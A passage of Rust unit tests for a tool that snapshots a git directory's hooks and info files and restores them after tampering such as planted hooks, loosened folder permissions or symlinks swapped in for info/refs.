        let folder = dir.path().join("hooks/pre-commit");
        fs::create_dir(&folder).unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, std::slice::from_ref(&folder));
        assert!(!folder.exists());
    }

    #[test]
    fn a_removed_empty_folder_is_made_again() {
        let dir = tempfile::tempdir().unwrap();
        let folder = dir.path().join("hooks/empty");
        fs::create_dir_all(&folder).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::remove_dir(&folder).unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, std::slice::from_ref(&folder));
        assert!(folder.is_dir());
    }

    #[cfg(unix)]
    #[test]
    fn a_folder_opened_to_everybody_gets_its_permissions_back() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let folder = dir.path().join("hooks/sub");
        fs::create_dir_all(&folder).unwrap();
        fs::write(folder.join("kept"), "mine").unwrap();
        fs::set_permissions(&folder, fs::Permissions::from_mode(0o755)).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        // Any user of the computer could now plant a hook there.
        fs::set_permissions(&folder, fs::Permissions::from_mode(0o777)).unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, std::slice::from_ref(&folder));
        let mode = fs::metadata(&folder).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o755);
        assert_eq!(fs::read_to_string(folder.join("kept")).unwrap(), "mine");
    }

    #[cfg(unix)]
    #[test]
    fn a_locked_folder_stays_locked_and_is_not_a_change() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join("hooks");
        fs::create_dir_all(&hooks).unwrap();
        fs::write(hooks.join("pre-commit"), "cargo test").unwrap();
        // The user's own choice: enter and read, but no change.
        fs::set_permissions(&hooks, fs::Permissions::from_mode(0o555)).unwrap();
        let watched = watched(dir.path());
        let mode = || fs::metadata(&hooks).unwrap().permissions().mode() & 0o777;

        let before = watched.snapshot();
        assert_eq!(
            mode(),
            0o555,
            "the role sees the folder as the user left it"
        );
        let changes = before.check_and_restore(&watched);

        assert_eq!(changes, Changes::default());
        assert_eq!(mode(), 0o555);
        fs::set_permissions(&hooks, fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn a_link_in_place_of_info_refs_is_removed() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("info")).unwrap();
        fs::write(dir.path().join("info/refs"), "abc123\trefs/heads/main\n").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        let refs = dir.path().join("info/refs");
        fs::remove_file(&refs).unwrap();
        std::os::unix::fs::symlink("../hooks", &refs).unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, std::slice::from_ref(&refs));
        fs::symlink_metadata(&refs).unwrap_err();
    }

    #[test]
    fn a_folder_in_place_of_info_refs_is_removed() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("info")).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        let refs = dir.path().join("info/refs");
        fs::create_dir(&refs).unwrap();
        fs::write(refs.join("run"), "planted").unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, [refs.clone(), refs.join("run")]);
        assert!(!refs.exists());
    }

    #[test]
    fn an_info_folder_made_for_claude_codes_stub_lines_is_not_a_change() {
        let dir = tempfile::tempdir().unwrap();
        let watched = watched(dir.path());
        // `git init` with an empty template makes no `info/`.
        let before = watched.snapshot();
        fs::create_dir(dir.path().join("info")).unwrap();
        fs::write(
            dir.path().join("info/exclude"),
            "\n\n# claude-code scrub-mode stubs\n/.env",
        )
        .unwrap();

        let changes = before.check_and_restore(&watched);

        assert!(changes.is_empty() && changes.claude_stubs, "{changes:?}");
    }

    #[test]
    fn an_info_folder_made_by_git_for_info_refs_is_not_a_change() {
        let dir = tempfile::tempdir().unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::create_dir(dir.path().join("info")).unwrap();
        fs::write(dir.path().join("info/refs"), "abc123\trefs/heads/main\n").unwrap();

        assert_eq!(before.check_and_restore(&watched), Changes::default());
    }

    #[cfg(unix)]
    #[test]
    fn folder_rights_below_a_path_not_put_back_are_left_alone() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let inner = dir.path().join("hooks/sub/inner");
        fs::create_dir_all(&inner).unwrap();
        fs::set_permissions(&inner, fs::Permissions::from_mode(0o755)).unwrap();
        let before = watched(dir.path()).snapshot();
        // As if `hooks/sub` were a link to elsewhere that could not be removed.
        fs::set_permissions(&inner, fs::Permissions::from_mode(0o700)).unwrap();

        let failed = put_back_folder_modes(&before.files, &[dir.path().join("hooks/sub")]);

        assert_eq!(failed, Vec::<PathBuf>::new());
        let mode = fs::metadata(&inner).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o700);
    }
}
